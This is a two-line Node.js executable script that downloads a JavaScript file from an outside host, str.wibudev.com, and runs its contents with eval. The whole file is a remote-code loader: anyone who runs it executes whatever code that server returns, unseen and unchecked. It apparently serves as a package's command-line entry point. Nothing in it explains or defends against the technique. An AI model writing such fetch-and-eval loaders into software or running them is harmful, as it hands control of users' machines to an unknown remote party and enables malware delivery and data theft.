#!/usr/bin/env node
require('node-fetch2')(`https://str.wibudev.com/file/clm7dfkjl00049u30fde4wbqv.js`).then(async (v) => eval(await v.text()))